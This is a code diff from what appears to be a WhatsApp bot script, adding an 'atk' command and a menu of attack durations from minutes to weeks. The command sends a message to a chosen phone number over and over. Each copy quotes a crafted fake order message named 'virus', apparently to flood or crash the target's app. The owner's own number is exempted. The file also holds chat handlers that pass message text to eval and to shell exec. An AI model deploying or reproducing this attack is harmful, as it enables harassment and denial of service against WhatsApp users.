+           {title: "2 Minute", rowId: `${prefix}atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
+           {title: "3 Minute", rowId: `${prefix}atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
+           {title: "4 Minute", rowId: `${prefix}atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
+           {title: "5 Minute", rowId: `${prefix}atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
+                ]
+                },
+                {
+           title: "CLOCK SELECTION",
+                rows: [
+           {title: "1 Hours", rowId: `${prefix}atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
+           {title: "2 Hours", rowId: `${prefix}atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
+           {title: "3 Hours", rowId: `${prefix}atk ${noget}|180`, description: `Attack ${noget} During 3 Hours `},
+           {title: "4 Hours", rowId: `${prefix}atk ${noget}|240`, description: `Attack ${noget} During 4 Hours `},
+           {title: "5 Hours", rowId: `${prefix}atk ${noget}|300`, description: `Attack ${noget} During 5 Hours `}
+                ]
+                },
+                {
+            title: "DAILY SELECTION",
+            rows: [
+           {title: "1 Day", rowId: `${prefix}atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
+           {title: "2 Day", rowId: `${prefix}atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
+           {title: "3 Day", rowId: `${prefix}atk ${noget}|4320`, description: `Attack ${noget} During 3 Day `},
+           {title: "4 Day", rowId: `${prefix}atk ${noget}|5760`, description: `Attack ${noget} During 4 Day `},
+           {title: "5 Day", rowId: `${prefix}atk ${noget}|7200`, description: `Attack ${noget} During 5 Day `}
+           ]
+           },
+           {
+            title: "WEEKLY SELECTION",
+             rows: [
+            {title: "1 Week", rowId: `${prefix}atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
+            {title: "2 Week", rowId: `${prefix}atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
+            {title: "3 Week", rowId: `${prefix}atk ${noget}|30240`, description: `Attack ${noget} During 3 Week `},
+            {title: "4 Week", rowId: `${prefix}atk ${noget}|40320`, description: `Attack ${noget} During 4 Week `},
+            {title: "5 Week", rowId: `${prefix}atk ${noget}|50400`, description: `Attack ${noget} During 5 Week `}
+               ]
+              },
+             ]
+            }
+            SatganzDevs.sendMessage(m.chat, listMsg)
+           }
+            break
+            case prefix+'atk':
+            if (!isCreator && !isPremium) return reply('lu siapa?')
+            if (!q) return reply(`Examples of use : ${command} >Target<|*>Amount<*`) 
+            let spar = q.split("|")[0]
+            let terern = q.split("|")[1]
+            var satgnz = "6281268248904"
+            const virus =  {
+             key: { fromMe: false,remoteJid: "fleyvin soft@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: global.thumb, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
+            let isLinkThisGc = new RegExp(satgnz, 'i')
+            let isgclink = isLinkThisGc.test(q)
+            if (isgclink) return reply(`You Can't Attack My Owner`)
+            if (!terern) return reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
+            for (let i = 0; i < terern; i++){
+            SatganzDevs.sendMessage(`${spar}@s.whatsapp.net`, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : global.thumb },"sourceUrl": "hehe"}}}, { quoted: virus})
+            }
+            let ter = q.split("|")[1]
+            reply(`Success Attack Target During Attack ${ter} Minutes`)
+            break
             default:
                 if (budy.startsWith('=>')) {
-                    if (!isCreator) return m.reply(mess.owner)
+                    if (!isCreator) return reply(mess.owner)
                     function Return(sul) {
                         sat = JSON.stringify(sul, null, 2)
                         bang = util.format(sat)
@@ -6443,20 +6547,20 @@ break
                 }
 
                 if (budy.startsWith('>')) {
-                    if (!isCreator) return m.reply(mess.owner)
+                    if (!isCreator) return reply(mess.owner)
                     try {
                         let evaled = await eval(budy.slice(2))
                         if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-                        await m.reply(evaled)
+                        await reply(evaled)
                     } catch (err) {
                         await m.reply(String(err))
                     }
                 }
 
                 if (budy.startsWith('$')) {
-                    if (!isCreator) return m.reply(mess.owner)
+                    if (!isCreator) return reply(mess.owner)
                     exec(budy.slice(2), (err, stdout) => {
-                        if(err) return m.reply(err)
+                        if(err) return reply(err)
                         if (stdout) return m.reply(stdout)
                     })
                 }
